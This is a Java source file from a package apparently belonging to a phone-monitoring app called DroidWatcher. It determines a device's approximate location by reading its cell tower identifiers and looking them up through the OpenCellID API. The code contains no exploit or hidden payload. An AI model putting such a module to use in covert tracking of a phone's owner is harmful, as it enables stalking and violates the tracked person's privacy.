package com.droidwatcher.modules.location;

import java.io.StringReader;
import java.util.Date;

import org.acra.ACRA;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.xmlpull.v1.XmlPullParser;

import com.droidwatcher.Debug;
import com.droidwatcher.lib.GPS;
import com.droidwatcher.security.SecuriryInfo;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Xml;

public class GsmLocationListener {
	private static final String API_KEY = SecuriryInfo.openCellIdApiKey;
	
	private static final int DEFAULT_ACC = 1000;
	
	private ILocationResultListener mResultListner;
	private Context mContext;
	
	public GsmLocationListener(Context context){
		mContext = context;
	}
	
	public void getLocation(ILocationResultListener listener){
		mResultListner = listener;
		
		try {
			TelephonyManager telephonyManager = (TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
			GsmCellLocation cellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
			
			String networkOperator = telephonyManager.getNetworkOperator();
			
			if (networkOperator == null || networkOperator.length() == 0){
				mResultListner.onNoResult();
				return;
			}

			int mcc = Integer.parseInt(networkOperator.substring(0, 3));
	        int mnc = Integer.parseInt(networkOperator.substring(3));
	        int cellid = cellLocation.getCid();
	        int lac = cellLocation.getLac();
	        
	        if (cellid == -1 || lac == -1 || !isNetworkAvailable()) {
	        	mResultListner.onNoResult();
				return;
			}
	        
	        makeRequest(mcc, mnc, cellid, lac);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleException(e);
			
			mResultListner.onNoResult();
		}
	}
	
	private void makeRequest(final int mcc, final int mnc, final int cellid, final int lac){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try{
					String uri = "http://opencellid.org/cell/get?key="+API_KEY+"&mcc="+mcc+"&mnc="+mnc+"&lac="+lac+"&cellid=" + cellid;
					HttpGet httpGet = new HttpGet(uri);
					httpGet.setHeader("Content-Type", "application/x-www-form-urlencoded");
					
					HttpClient httpClient = new DefaultHttpClient();
					HttpResponse response = httpClient.execute(httpGet);
					
					if (response != null){
						HttpEntity entity = response.getEntity();
						
						if (entity != null) {
			                String data = EntityUtils.toString(entity, "UTF-8");	                
			                parseData(data);
			                return;
			            }
					}
					
				} catch (Exception e) {
					Debug.exception(e);
					ACRA.getErrorReporter().handleException(e);
				}
				
				mResultListner.onNoResult();
			}
		}).start();
	}
	
	private void parseData(String data){
		Debug.i(data);
		
		try{
			XmlPullParser parser = Xml.newPullParser();
			parser.setInput(new StringReader(data));
			parser.nextTag();
			
			parser.require(XmlPullParser.START_TAG, null, "rsp");
			String stat = parser.getAttributeValue(null, "stat");
        	Debug.i(stat);
        	if (!stat.equals("ok")) {
        		mResultListner.onNoResult();
        		return;
			}
        	
		    while (parser.next() != XmlPullParser.END_TAG) {
		        String name = parser.getName();
		        if (name.equals("cell")) {
		            double lat = Double.parseDouble(parser.getAttributeValue(null, "lat"));
		            double lon = Double.parseDouble(parser.getAttributeValue(null, "lon"));
		            
		            GPS gps = new GPS(DEFAULT_ACC, 0, lat, lon, new Date().getTime());
		            mResultListner.onGsmLocationResult(gps);
		            break;
		        }
		    }
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleException(e);
			
			mResultListner.onNoResult();
		}
	}
	
	private Boolean isNetworkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
}
